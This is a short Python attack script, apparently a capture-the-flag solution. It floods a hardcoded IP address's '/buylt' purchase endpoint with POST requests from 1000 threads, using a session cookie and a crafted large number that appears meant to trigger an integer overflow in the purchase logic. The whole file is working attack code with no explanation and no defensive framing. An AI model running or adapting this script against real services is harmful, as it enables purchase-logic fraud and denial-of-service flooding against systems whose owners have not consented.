#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author: liang 
import json
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def echke():
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99',
            'Cookie': 'go_iris_cookie=9ad6f65a-0e76-4b4f-a128-cf2fcff5043b',
    }
    data={'number':'3689348814741910324'}
    url='http://49.4.79.1:32228/buylt'
    ret=requests.post(url=url,headers=headers,data=data)
    print(ret.text)


thread = 1000
try:
    with ThreadPoolExecutor(thread) as exector:
        for i in range(1,5000000000000000000):
            response = exector.submit(echke,)
            if  response:
                pass
            else:
                print(response)
except Exception as e:
    try:
        with ThreadPoolExecutor(thread) as exector:
            for i in range(1, 5000000000000000000):
                response = exector.submit(echke, )
                if response:
                    pass
                else:
                    print(response)
    except Exception as e:
        with ThreadPoolExecutor(thread) as exector:
            for i in range(1, 5000000000000000000):
                response = exector.submit(echke, )
                if response:
                    pass
                else:
                    print(response)